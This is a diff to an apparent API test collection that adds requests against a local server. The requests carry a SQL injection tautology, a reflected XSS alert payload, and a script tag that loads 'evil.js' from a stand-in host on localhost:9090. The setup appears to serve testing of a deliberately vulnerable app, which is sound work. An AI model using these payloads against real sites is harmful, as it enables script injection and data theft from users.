@@ -10,7 +10,37 @@
 			"name": "sql-reflection-1",
 			"request": {
 				"method": "GET",
-				"header": []
+				"header": [],
+				"url": {
+					"raw": "http://127.0.0.1:8000/search?name=<script>alert(\"XSS\")</script>",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "8000",
+					"path": [
+						"search"
+					],
+					"query": [
+						{
+							"key": "name",
+							"value": "' OR '1'='1",
+							"disabled": true
+						},
+						{
+							"key": "name",
+							"value": "<script>alert(\"XSS\")</script>"
+						},
+						{
+							"key": "name",
+							"value": "Ceci",
+							"disabled": true
+						}
+					]
+				}
 			},
 			"response": []
 		},
@@ -18,7 +48,27 @@
 			"name": "sql-reflection-2",
 			"request": {
 				"method": "GET",
-				"header": []
+				"header": [],
+				"url": {
+					"raw": "http://127.0.0.1:8000/greet?name=jorge <script src=\"http://localhost:9090/evil.js\"></script>",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "8000",
+					"path": [
+						"greet"
+					],
+					"query": [
+						{
+							"key": "name",
+							"value": "jorge <script src=\"http://localhost:9090/evil.js\"></script>"
+						}
+					]
+				}
 			},
 			"response": []
 		}
